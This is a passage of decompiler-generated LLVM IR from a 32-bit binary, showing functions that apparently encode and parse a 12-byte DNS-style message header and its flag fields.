  uselistorder label %dec_label_pc_805605d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056050, { 1, 0 }
  uselistorder label %dec_label_pc_805604c, { 1, 0 }
  uselistorder label %dec_label_pc_8056038, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8056035, { 1, 0 }
  uselistorder label %dec_label_pc_805600b, { 1, 0 }
}

define i32 @function_805615c() local_unnamed_addr {
dec_label_pc_805615c:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_4()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_805615d = load i32, i32* @ebx, align 4
  store i32 %v0_805615d, i32* %stack_var_-8, align 4
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  %v4_8056165 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8056165, i32* %esi.global-to-local, align 4
  %v7_805616e = icmp sgt i32 %tmp, 11
  br i1 %v7_805616e, label %dec_label_pc_8056174, label %dec_label_pc_805620a

dec_label_pc_8056174:                             ; preds = %dec_label_pc_805615c
  %v1_8056174 = add i32 %tmp6, 1
  %v2_8056174 = inttoptr i32 %v1_8056174 to i8*
  %v3_8056174 = load i8, i8* %v2_8056174, align 1
  store i8 %v3_8056174, i8* %tmp5, align 1
  %v0_805617a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805617a = inttoptr i32 %v0_805617a to i32*
  %v2_805617a = load i32, i32* %v1_805617a, align 4
  %v1_805617c = trunc i32 %v2_805617a to i8
  %v2_805617c = load i32, i32* %esi.global-to-local, align 4
  %v3_805617c = add i32 %v2_805617c, 1
  %v4_805617c = inttoptr i32 %v3_805617c to i8*
  store i8 %v1_805617c, i8* %v4_805617c, align 1
  %v0_80561a2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80561a2 = add i32 %v0_80561a2, 8
  %v2_80561a2 = inttoptr i32 %v1_80561a2 to i32*
  %v3_80561a2 = load i32, i32* %v2_80561a2, align 4
  %v1_80561a5 = mul i32 %v3_80561a2, 8
  %v2_80561ab = or i32 %v1_80561a5, 4
  %v1_80561ad = add i32 %v0_80561a2, 20
  %v2_80561ad = inttoptr i32 %v1_80561ad to i32*
  %v3_80561ad = load i32, i32* %v2_80561ad, align 4
  %v4_80561ad = icmp eq i32 %v3_80561ad, 0
  %v1_80561b1 = icmp eq i1 %v4_80561ad, false
  %v2_80561b1 = zext i1 %v1_80561b1 to i32
  %v2_80561b4 = or i32 %v2_80561b1, %v2_80561ab
  %v2_80561b6 = or i32 %v2_80561b4, -126
  %v5_80561b6 = trunc i32 %v2_80561b6 to i8
  store i32 %v2_80561b6, i32* @ecx, align 4
  %v2_80561b8 = load i32, i32* %esi.global-to-local, align 4
  %v3_80561b8 = add i32 %v2_80561b8, 2
  %v4_80561b8 = inttoptr i32 %v3_80561b8 to i8*
  store i8 %v5_80561b6, i8* %v4_80561b8, align 1
  %v0_80561bb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80561c1 = add i32 %v0_80561bb, 28
  %v2_80561c1 = inttoptr i32 %v1_80561c1 to i8*
  %v3_80561c1 = load i8, i8* %v2_80561c1, align 1
  %tmp10 = urem i8 %v3_80561c1, 16
  %v2_80561cc = or i8 %tmp10, -128
  %v2_80561ce = load i32, i32* %esi.global-to-local, align 4
  %v3_80561ce = add i32 %v2_80561ce, 3
  %v4_80561ce = inttoptr i32 %v3_80561ce to i8*
  store i8 %v2_80561cc, i8* %v4_80561ce, align 1
  %v0_80561d1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80561d1 = add i32 %v0_80561d1, 33
  %v2_80561d1 = inttoptr i32 %v1_80561d1 to i8*
  %v3_80561d1 = load i8, i8* %v2_80561d1, align 1
  %v2_80561d5 = load i32, i32* %esi.global-to-local, align 4
  %v3_80561d5 = add i32 %v2_80561d5, 4
  %v4_80561d5 = inttoptr i32 %v3_80561d5 to i8*
  store i8 %v3_80561d1, i8* %v4_80561d5, align 1
  %v0_80561d8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80561d8 = add i32 %v0_80561d8, 32
  %v2_80561d8 = inttoptr i32 %v1_80561d8 to i32*
  %v3_80561d8 = load i32, i32* %v2_80561d8, align 4
  %v1_80561db = trunc i32 %v3_80561d8 to i8
  %v2_80561db = load i32, i32* %esi.global-to-local, align 4
  %v3_80561db = add i32 %v2_80561db, 5
  %v4_80561db = inttoptr i32 %v3_80561db to i8*
  store i8 %v1_80561db, i8* %v4_80561db, align 1
  %v0_80561de = load i32, i32* %ebx.global-to-local, align 4
  %v1_80561de = add i32 %v0_80561de, 37
  %v2_80561de = inttoptr i32 %v1_80561de to i8*
  %v3_80561de = load i8, i8* %v2_80561de, align 1
  %v2_80561e2 = load i32, i32* %esi.global-to-local, align 4
  %v3_80561e2 = add i32 %v2_80561e2, 6
  %v4_80561e2 = inttoptr i32 %v3_80561e2 to i8*
  store i8 %v3_80561de, i8* %v4_80561e2, align 1
  %v0_80561e5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80561e5 = add i32 %v0_80561e5, 36
  %v2_80561e5 = inttoptr i32 %v1_80561e5 to i32*
  %v3_80561e5 = load i32, i32* %v2_80561e5, align 4
  %v1_80561e8 = trunc i32 %v3_80561e5 to i8
  %v2_80561e8 = load i32, i32* %esi.global-to-local, align 4
  %v3_80561e8 = add i32 %v2_80561e8, 7
  %v4_80561e8 = inttoptr i32 %v3_80561e8 to i8*
  store i8 %v1_80561e8, i8* %v4_80561e8, align 1
  %v0_80561eb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80561eb = add i32 %v0_80561eb, 41
  %v2_80561eb = inttoptr i32 %v1_80561eb to i8*
  %v3_80561eb = load i8, i8* %v2_80561eb, align 1
  %v2_80561ef = load i32, i32* %esi.global-to-local, align 4
  %v3_80561ef = add i32 %v2_80561ef, 8
  %v4_80561ef = inttoptr i32 %v3_80561ef to i8*
  store i8 %v3_80561eb, i8* %v4_80561ef, align 1
  %v0_80561f2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80561f2 = add i32 %v0_80561f2, 40
  %v2_80561f2 = inttoptr i32 %v1_80561f2 to i32*
  %v3_80561f2 = load i32, i32* %v2_80561f2, align 4
  %v1_80561f5 = trunc i32 %v3_80561f2 to i8
  %v2_80561f5 = load i32, i32* %esi.global-to-local, align 4
  %v3_80561f5 = add i32 %v2_80561f5, 9
  %v4_80561f5 = inttoptr i32 %v3_80561f5 to i8*
  store i8 %v1_80561f5, i8* %v4_80561f5, align 1
  %v0_80561f8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80561f8 = add i32 %v0_80561f8, 45
  %v2_80561f8 = inttoptr i32 %v1_80561f8 to i8*
  %v3_80561f8 = load i8, i8* %v2_80561f8, align 1
  %v2_80561fc = load i32, i32* %esi.global-to-local, align 4
  %v3_80561fc = add i32 %v2_80561fc, 10
  %v4_80561fc = inttoptr i32 %v3_80561fc to i8*
  store i8 %v3_80561f8, i8* %v4_80561fc, align 1
  %v0_80561ff = load i32, i32* %ebx.global-to-local, align 4
  %v1_80561ff = add i32 %v0_80561ff, 44
  %v2_80561ff = inttoptr i32 %v1_80561ff to i32*
  %v3_80561ff = load i32, i32* %v2_80561ff, align 4
  %v1_8056202 = trunc i32 %v3_80561ff to i8
  %v2_8056202 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056202 = add i32 %v2_8056202, 11
  %v4_8056202 = inttoptr i32 %v3_8056202 to i8*
  store i8 %v1_8056202, i8* %v4_8056202, align 1
  %v2_805620a.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805620a

dec_label_pc_805620a:                             ; preds = %dec_label_pc_805615c, %dec_label_pc_8056174
  %v2_805620a = phi i32 [ %v0_805615d, %dec_label_pc_805615c ], [ %v2_805620a.pre, %dec_label_pc_8056174 ]
  %v0_805620c = phi i32 [ -1, %dec_label_pc_805615c ], [ 12, %dec_label_pc_8056174 ]
  store i32 %v2_805620a, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805620c

; uselistorder directives
  uselistorder i32 45, { 6, 2, 5, 4, 1, 0, 3 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 3, 1, 2, 0 }
  uselistorder i32 33, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805620a, { 1, 0 }
}

define i32 @function_8056210() local_unnamed_addr {
dec_label_pc_8056210:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-4 = alloca i32, align 4
  %v0_8056210 = load i32, i32* @ebx, align 4
  store i32 %v0_8056210, i32* %stack_var_-4, align 4
  %v4_8056211 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8056211, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8056219 = load i8, i8* %tmp2, align 1
  %v3_8056219 = zext i8 %v2_8056219 to i32
  %v1_805621c = add i32 %v4_8056211, 1
  %v2_805621c = inttoptr i32 %v1_805621c to i8*
  %v3_805621c = load i8, i8* %v2_805621c, align 1
  %v4_805621c = zext i8 %v3_805621c to i32
  %v2_8056220 = mul nuw nsw i32 %v3_8056219, 256
  %v2_8056223 = or i32 %v4_805621c, %v2_8056220
  %v2_8056225 = inttoptr i32 %tmp to i32*
  store i32 %v2_8056223, i32* %v2_8056225, align 4
  %v0_8056227 = load i32, i32* @ecx, align 4
  %v1_8056227 = add i32 %v0_8056227, 2
  %v2_8056227 = inttoptr i32 %v1_8056227 to i8*
  %v3_8056227 = load i8, i8* %v2_8056227, align 1
  %tmp6 = icmp slt i8 %v3_8056227, 0
  %v2_805622b = zext i1 %tmp6 to i32
  %v1_805622e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805622e = add i32 %v1_805622e, 4
  %v3_805622e = inttoptr i32 %v2_805622e to i32*
  store i32 %v2_805622b, i32* %v3_805622e, align 4
  %v0_8056231 = load i32, i32* @ecx, align 4
  %v1_8056231 = add i32 %v0_8056231, 2
  %v2_8056231 = inttoptr i32 %v1_8056231 to i8*
  %v3_8056231 = load i8, i8* %v2_8056231, align 1
  %v3_8056234 = udiv i8 %v3_8056231, 8
  %tmp7 = urem i8 %v3_8056234, 16
  %v1_8056237 = zext i8 %tmp7 to i32
  %v1_805623a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805623a = add i32 %v1_805623a, 8
  %v3_805623a = inttoptr i32 %v2_805623a to i32*
  store i32 %v1_8056237, i32* %v3_805623a, align 4
  %v0_805623d = load i32, i32* @ecx, align 4
  %v1_805623d = add i32 %v0_805623d, 2
  %v2_805623d = inttoptr i32 %v1_805623d to i8*
  %v3_805623d = load i8, i8* %v2_805623d, align 1
  %div = udiv i8 %v3_805623d, 4
  %tmp8 = urem i8 %div, 2
  %v1_8056244 = zext i8 %tmp8 to i32
  %v1_8056247 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056247 = add i32 %v1_8056247, 12
  %v3_8056247 = inttoptr i32 %v2_8056247 to i32*
  store i32 %v1_8056244, i32* %v3_8056247, align 4
  %v0_805624a = load i32, i32* @ecx, align 4
  %v1_805624a = add i32 %v0_805624a, 2
  %v2_805624a = inttoptr i32 %v1_805624a to i8*
  %v3_805624a = load i8, i8* %v2_805624a, align 1
  %div5 = udiv i8 %v3_805624a, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8056250 = zext i8 %tmp9 to i32
  %v1_8056253 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056253 = add i32 %v1_8056253, 16
  %v3_8056253 = inttoptr i32 %v2_8056253 to i32*
  store i32 %v1_8056250, i32* %v3_8056253, align 4
  %v0_8056256 = load i32, i32* @ecx, align 4
  %v1_8056256 = add i32 %v0_8056256, 2
  %v2_8056256 = inttoptr i32 %v1_8056256 to i8*
  %v3_8056256 = load i8, i8* %v2_8056256, align 1
  %tmp10 = urem i8 %v3_8056256, 2
  %v1_805625a = zext i8 %tmp10 to i32
  %v1_805625d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805625d = add i32 %v1_805625d, 20
  %v3_805625d = inttoptr i32 %v2_805625d to i32*
  store i32 %v1_805625a, i32* %v3_805625d, align 4
  %v0_8056260 = load i32, i32* @ecx, align 4
  %v1_8056260 = add i32 %v0_8056260, 3
  %v2_8056260 = inttoptr i32 %v1_8056260 to i8*
  %v3_8056260 = load i8, i8* %v2_8056260, align 1
  %tmp11 = icmp slt i8 %v3_8056260, 0
  %v2_8056264 = zext i1 %tmp11 to i32
  %v1_8056267 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056267 = add i32 %v1_8056267, 24
  %v3_8056267 = inttoptr i32 %v2_8056267 to i32*
  store i32 %v2_8056264, i32* %v3_8056267, align 4
  %v0_805626a = load i32, i32* @ecx, align 4
  %v1_805626a = add i32 %v0_805626a, 3
  %v2_805626a = inttoptr i32 %v1_805626a to i8*
  %v3_805626a = load i8, i8* %v2_805626a, align 1
  %tmp12 = urem i8 %v3_805626a, 16
  %v1_805626e = zext i8 %tmp12 to i32
  %v1_8056271 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056271 = add i32 %v1_8056271, 28
  %v3_8056271 = inttoptr i32 %v2_8056271 to i32*
  store i32 %v1_805626e, i32* %v3_8056271, align 4
  %v0_8056274 = load i32, i32* @ecx, align 4
  %v1_8056274 = add i32 %v0_8056274, 4
  %v2_8056274 = inttoptr i32 %v1_8056274 to i8*
  %v3_8056274 = load i8, i8* %v2_8056274, align 1
  %v4_8056274 = zext i8 %v3_8056274 to i32
  %v1_8056278 = add i32 %v0_8056274, 5
  %v2_8056278 = inttoptr i32 %v1_8056278 to i8*
  %v3_8056278 = load i8, i8* %v2_8056278, align 1
  %v4_8056278 = zext i8 %v3_8056278 to i32
  %v2_805627c = mul nuw nsw i32 %v4_8056274, 256
  %v2_805627f = or i32 %v4_8056278, %v2_805627c
  %v1_8056281 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056281 = add i32 %v1_8056281, 32
  %v3_8056281 = inttoptr i32 %v2_8056281 to i32*
  store i32 %v2_805627f, i32* %v3_8056281, align 4
  %v0_8056284 = load i32, i32* @ecx, align 4
  %v1_8056284 = add i32 %v0_8056284, 6
  %v2_8056284 = inttoptr i32 %v1_8056284 to i8*
  %v3_8056284 = load i8, i8* %v2_8056284, align 1
  %v4_8056284 = zext i8 %v3_8056284 to i32
  %v1_8056288 = add i32 %v0_8056284, 7
  %v2_8056288 = inttoptr i32 %v1_8056288 to i8*
  %v3_8056288 = load i8, i8* %v2_8056288, align 1
  %v4_8056288 = zext i8 %v3_8056288 to i32
  %v2_805628c = mul nuw nsw i32 %v4_8056284, 256
  %v2_805628f = or i32 %v4_8056288, %v2_805628c
  %v1_8056291 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056291 = add i32 %v1_8056291, 36
  %v3_8056291 = inttoptr i32 %v2_8056291 to i32*
  store i32 %v2_805628f, i32* %v3_8056291, align 4
  %v0_8056294 = load i32, i32* @ecx, align 4
  %v1_8056294 = add i32 %v0_8056294, 8
  %v2_8056294 = inttoptr i32 %v1_8056294 to i8*
  %v3_8056294 = load i8, i8* %v2_8056294, align 1
  %v4_8056294 = zext i8 %v3_8056294 to i32
  %v1_8056298 = add i32 %v0_8056294, 9
  %v2_8056298 = inttoptr i32 %v1_8056298 to i8*
  %v3_8056298 = load i8, i8* %v2_8056298, align 1
  %v4_8056298 = zext i8 %v3_8056298 to i32
  %v2_805629c = mul nuw nsw i32 %v4_8056294, 256
  %v2_805629f = or i32 %v4_8056298, %v2_805629c
  %v1_80562a1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80562a1 = add i32 %v1_80562a1, 40
  %v3_80562a1 = inttoptr i32 %v2_80562a1 to i32*
  store i32 %v2_805629f, i32* %v3_80562a1, align 4
  %v0_80562a4 = load i32, i32* @ecx, align 4
  %v1_80562a4 = add i32 %v0_80562a4, 10
  %v2_80562a4 = inttoptr i32 %v1_80562a4 to i8*
  %v3_80562a4 = load i8, i8* %v2_80562a4, align 1
  %v4_80562a4 = zext i8 %v3_80562a4 to i32
  %v1_80562a8 = add i32 %v0_80562a4, 11
  %v2_80562a8 = inttoptr i32 %v1_80562a8 to i8*
  %v3_80562a8 = load i8, i8* %v2_80562a8, align 1
  %v4_80562a8 = zext i8 %v3_80562a8 to i32
  %v2_80562ac = mul nuw nsw i32 %v4_80562a4, 256
  %v2_80562af = or i32 %v4_80562a8, %v2_80562ac
  %v1_80562b1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80562b1 = add i32 %v1_80562b1, 44
  %v3_80562b1 = inttoptr i32 %v2_80562b1 to i32*
  store i32 %v2_80562af, i32* %v3_80562b1, align 4
  %v2_80562b9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80562b9, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 9, 10, 4, 5, 6, 11, 2, 7, 8, 0, 1, 3 }
  uselistorder i32 7, { 13, 14, 3, 0, 6, 4, 2, 7, 9, 10, 11, 12, 5, 8, 1 }
  uselistorder i32 6, { 21, 22, 1, 2, 17, 18, 6, 12, 10, 11, 7, 23, 19, 20, 3, 0, 4, 13, 14, 15, 16, 5, 8, 9 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 15, 5, 12, 18, 19, 6, 20, 7, 8, 9, 10, 16, 17, 11, 14, 13 }
  uselistorder i8 8, { 0, 8, 9, 4, 5, 1, 6, 7, 3, 2 }
}

define i32 @function_80562bc() local_unnamed_addr {
dec_label_pc_80562bc:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_80562bc = load i32, i32* @edi, align 4
  %v0_80562bd = load i32, i32* @esi, align 4
  %v0_80562be = load i32, i32* @ebx, align 4
  store i32 %v0_80562be, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_80562cb = load i32, i32* @eax, align 4
  %v1_80562ce = inttoptr i32 %tmp3 to i32*
  %v2_80562ce = load i32, i32* %v1_80562ce, align 4
  %v7_80562d0 = inttoptr i32 %v2_80562ce to i8*
  %v8_80562d0 = call i32 @function_80568c8(i8* %v7_80562d0, i32 %tmp2, i32 %tmp, i32 %v0_80562cb, i32 %v0_80562be, i32 %v0_80562bd, i32 %v0_80562bc)
  store i32 %v8_80562d0, i32* @ecx, align 4
  %v2_80562da = icmp slt i32 %v8_80562d0, 0
  br i1 %v2_80562da, label %dec_label_pc_8056309, label %dec_label_pc_80562de

dec_label_pc_80562de:                             ; preds = %dec_label_pc_80562bc
  %v0_80562de = load i32, i32* @ebx, align 4
  %v2_80562de = sub i32 %v0_80562de, %v8_80562d0
  %v1_80562e0 = add i32 %v2_80562de, -3
  %v6_80562e0 = sub i32 2, %v2_80562de
  %v7_80562e0 = and i32 %v6_80562e0, %v2_80562de
  %v8_80562e0 = icmp slt i32 %v7_80562e0, 0
  %v9_80562e0 = icmp eq i32 %v1_80562e0, 0
  %v10_80562e0 = icmp slt i32 %v1_80562e0, 0
  %v3_80562e3 = icmp eq i1 %v10_80562e0, %v8_80562e0
  %v4_80562e3 = icmp eq i1 %v9_80562e0, false
  %v5_80562e3 = and i1 %v4_80562e3, %v3_80562e3
  br i1 %v5_80562e3, label %dec_label_pc_80562ea, label %dec_label_pc_80562e5

dec_label_pc_80562e5:                             ; preds = %dec_label_pc_80562de
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8056309

dec_label_pc_80562ea:                             ; preds = %dec_label_pc_80562de
  %v0_80562ea = load i32, i32* @edi, align 4
  %v2_80562ea = add i32 %v0_80562ea, %v8_80562d0
  store i32 %v2_80562ea, i32* @edx, align 4
  %v1_80562ed = add i32 %v8_80562d0, 4
  store i32 %v1_80562ed, i32* @ecx, align 4
  %v0_80562f0 = load i32, i32* @esi, align 4
  %v1_80562f0 = add i32 %v0_80562f0, 5
  %v2_80562f0 = inttoptr i32 %v1_80562f0 to i8*
  %v3_80562f0 = load i8, i8* %v2_80562f0, align 1
  %v3_80562f4 = inttoptr i32 %v2_80562ea to i8*
  store i8 %v3_80562f0, i8* %v3_80562f4, align 1
  %v0_80562f6 = load i32, i32* @esi, align 4
  %v1_80562f6 = add i32 %v0_80562f6, 4
  %v2_80562f6 = inttoptr i32 %v1_80562f6 to i32*
  %v3_80562f6 = load i32, i32* %v2_80562f6, align 4
  %v1_80562f9 = trunc i32 %v3_80562f6 to i8
  %v2_80562f9 = load i32, i32* @edx, align 4
  %v3_80562f9 = add i32 %v2_80562f9, 1
  %v4_80562f9 = inttoptr i32 %v3_80562f9 to i8*
  store i8 %v1_80562f9, i8* %v4_80562f9, align 1
  %v0_80562fc = load i32, i32* @esi, align 4
  %v1_80562fc = add i32 %v0_80562fc, 9
  %v2_80562fc = inttoptr i32 %v1_80562fc to i8*
  %v3_80562fc = load i8, i8* %v2_80562fc, align 1
  %v2_8056300 = load i32, i32* @edx, align 4
  %v3_8056300 = add i32 %v2_8056300, 2
  %v4_8056300 = inttoptr i32 %v3_8056300 to i8*
  store i8 %v3_80562fc, i8* %v4_8056300, align 1
  %v0_8056303 = load i32, i32* @esi, align 4
  %v1_8056303 = add i32 %v0_8056303, 8
  %v2_8056303 = inttoptr i32 %v1_8056303 to i32*
  %v3_8056303 = load i32, i32* %v2_8056303, align 4
  %v1_8056306 = trunc i32 %v3_8056303 to i8
  %v2_8056306 = load i32, i32* @edx, align 4
  %v3_8056306 = add i32 %v2_8056306, 3
  %v4_8056306 = inttoptr i32 %v3_8056306 to i8*
  store i8 %v1_8056306, i8* %v4_8056306, align 1
  %v0_8056309.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8056309

dec_label_pc_8056309:                             ; preds = %dec_label_pc_80562bc, %dec_label_pc_80562e5, %dec_label_pc_80562ea
  %v0_8056309 = phi i32 [ %v8_80562d0, %dec_label_pc_80562bc ], [ -1, %dec_label_pc_80562e5 ], [ %v0_8056309.pre, %dec_label_pc_80562ea ]
  %v2_805630b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805630b, i32* @ebx, align 4
  store i32 %v0_80562bc, i32* @edi, align 4
  ret i32 %v0_8056309

; uselistorder directives
  uselistorder i32 %v1_80562e0, { 1, 0 }
  uselistorder i32 %v2_80562de, { 0, 2, 1 }
  uselistorder i32 %v8_80562d0, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_8056309, { 2, 1, 0 }
}

define i32 @function_8056310() local_unnamed_addr {
dec_label_pc_8056310:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_805631b = call i32 @function_8056a30(i32 %tmp, i32 %tmp2)
  %v2_8056323 = icmp slt i32 %v2_805631b, 0
  br i1 %v2_8056323, label %dec_label_pc_805632a, label %dec_label_pc_8056327

dec_label_pc_8056327:                             ; preds = %dec_label_pc_8056310
  %v1_8056327 = add i32 %v2_805631b, 4
  br label %dec_label_pc_805632a

dec_label_pc_805632a:                             ; preds = %dec_label_pc_8056310, %dec_label_pc_8056327
  %v0_805632d = phi i32 [ %v2_805631b, %dec_label_pc_8056310 ], [ %v1_8056327, %dec_label_pc_8056327 ]
  ret i32 %v0_805632d

; uselistorder directives
  uselistorder label %dec_label_pc_805632a, { 1, 0 }
}

define i32 @function_8056330() local_unnamed_addr {
dec_label_pc_8056330:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8056330 = load i32, i32* @ebp, align 4
  %v0_8056331 = load i32, i32* @edi, align 4
  %v0_8056332 = load i32, i32* @esi, align 4
  %v0_8056333 = load i32, i32* @ebx, align 4
  store i32 %v0_8056333, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8056354 = ptrtoint i32* %stack_var_-272 to i32
  %v4_8056361 = call i32 @function_8056958(i32 %tmp4, i32 %tmp7, i32 %v2_8056354, i32 256)
  store i32 %v4_8056361, i32* @edi, align 4
  %v3_805636b = icmp slt i32 %v4_8056361, 0
  br i1 %v3_805636b, label %dec_label_pc_805641c, label %dec_label_pc_8056373

dec_label_pc_8056373:                             ; preds = %dec_label_pc_8056330
  %v0_8056373 = load i32, i32* @ebx, align 4
  %v3_8056373 = add i32 %v0_8056373, %v4_8056361
  %v0_8056375 = load i32, i32* @esi, align 4
  %v2_8056375 = sub i32 %v0_8056375, %v3_8056373
  %v1_805637b = add i32 %v2_8056375, -10
  %v10_805637b = icmp slt i32 %v1_805637b, 0
  store i32 %v1_805637b, i32* @esi, align 4
  %v1_8056382 = icmp eq i1 %v10_805637b, false
  br i1 %v1_8056382, label %dec_label_pc_805638b, label %dec_label_pc_8056384

dec_label_pc_8056384:                             ; preds = %dec_label_pc_8056373
  br label %dec_label_pc_805641c

dec_label_pc_805638b:                             ; preds = %dec_label_pc_8056373
  %v6_8056392 = add i32 %v3_8056373, %tmp4
  store i32 %v6_8056392, i32* @ebx, align 4
  %v1_805639e = call i32 @function_8055bfc(i32 %v2_8056354)
  %v1_80563a3 = load i32, i32* @ebp, align 4
  %v2_80563a3 = inttoptr i32 %v1_80563a3 to i32*
  store i32 %v1_805639e, i32* %v2_80563a3, align 4
  %v0_80563a6 = load i32, i32* @ebx, align 4
  %v1_80563a6 = add i32 %v0_80563a6, 4
  store i32 %v1_80563a6, i32* %esi.global-to-local, align 4
  %v1_80563a9 = inttoptr i32 %v0_80563a6 to i8*
  %v2_80563a9 = load i8, i8* %v1_80563a9, align 1
  %v3_80563a9 = zext i8 %v2_80563a9 to i32
  %v1_80563ac = add i32 %v0_80563a6, 1
  %v2_80563ac = inttoptr i32 %v1_80563ac to i8*
  %v3_80563ac = load i8, i8* %v2_80563ac, align 1
  %v4_80563ac = zext i8 %v3_80563ac to i32
  %v2_80563b0 = mul nuw nsw i32 %v3_80563a9, 256
  %v2_80563b3 = or i32 %v4_80563ac, %v2_80563b0
  %v1_80563b5 = load i32, i32* @ebp, align 4
  %v2_80563b5 = add i32 %v1_80563b5, 4
  %v3_80563b5 = inttoptr i32 %v2_80563b5 to i32*
  store i32 %v2_80563b3, i32* %v3_80563b5, align 4
  %v0_80563b8 = load i32, i32* @ebx, align 4
  %v1_80563b8 = add i32 %v0_80563b8, 2
  %v2_80563b8 = inttoptr i32 %v1_80563b8 to i8*
  %v3_80563b8 = load i8, i8* %v2_80563b8, align 1
  %v4_80563b8 = zext i8 %v3_80563b8 to i32
  %v1_80563bc = add i32 %v0_80563b8, 3
  %v2_80563bc = inttoptr i32 %v1_80563bc to i8*
  %v3_80563bc = load i8, i8* %v2_80563bc, align 1
  %v4_80563bc = zext i8 %v3_80563bc to i32
  %v2_80563c0 = mul nuw nsw i32 %v4_80563b8, 256
  %v2_80563c3 = or i32 %v4_80563bc, %v2_80563c0
  %v1_80563c5 = load i32, i32* @ebp, align 4
  %v2_80563c5 = add i32 %v1_80563c5, 8
  %v3_80563c5 = inttoptr i32 %v2_80563c5 to i32*
  store i32 %v2_80563c3, i32* %v3_80563c5, align 4
  %v0_80563c8 = load i32, i32* @ebx, align 4
  %v1_80563c8 = add i32 %v0_80563c8, 4
  %v2_80563c8 = inttoptr i32 %v1_80563c8 to i8*
  %v3_80563c8 = load i8, i8* %v2_80563c8, align 1
  %v4_80563c8 = zext i8 %v3_80563c8 to i32
  %v0_80563cc = load i32, i32* %esi.global-to-local, align 4
  %v1_80563cc = add i32 %v0_80563cc, 1
  %v2_80563cc = inttoptr i32 %v1_80563cc to i8*
  %v3_80563cc = load i8, i8* %v2_80563cc, align 1
  %v4_80563cc = zext i8 %v3_80563cc to i32
  %v2_80563d0 = mul nuw i32 %v4_80563c8, 16777216
  %v2_80563d3 = mul nuw nsw i32 %v4_80563cc, 65536
  %v1_80563d6 = add i32 %v0_80563cc, 2
  %v2_80563d6 = inttoptr i32 %v1_80563d6 to i8*
  %v3_80563d6 = load i8, i8* %v2_80563d6, align 1
  %v4_80563d6 = zext i8 %v3_80563d6 to i32
  %v2_80563da = mul nuw nsw i32 %v4_80563d6, 256
  %v2_80563dd = or i32 %v2_80563d3, %v2_80563d0
  %v1_80563df = add i32 %v0_80563cc, 3
  %v2_80563df = inttoptr i32 %v1_80563df to i8*
  %v3_80563df = load i8, i8* %v2_80563df, align 1
  %v4_80563df = zext i8 %v3_80563df to i32
  %v2_80563e3 = or i32 %v4_80563df, %v2_80563dd
  %v2_80563e5 = or i32 %v2_80563e3, %v2_80563da
  store i32 %v2_80563e5, i32* @ecx, align 4
  %v1_80563e7 = load i32, i32* @ebp, align 4
  %v2_80563e7 = add i32 %v1_80563e7, 12
  %v3_80563e7 = inttoptr i32 %v2_80563e7 to i32*
  store i32 %v2_80563e5, i32* %v3_80563e7, align 4
  %v0_80563ea = load i32, i32* @ebx, align 4
  %v1_80563ea = add i32 %v0_80563ea, 8
  %v2_80563ea = inttoptr i32 %v1_80563ea to i8*
  %v3_80563ea = load i8, i8* %v2_80563ea, align 1
  %v4_80563ea = zext i8 %v3_80563ea to i32
  %v1_80563ee = add i32 %v0_80563ea, 9
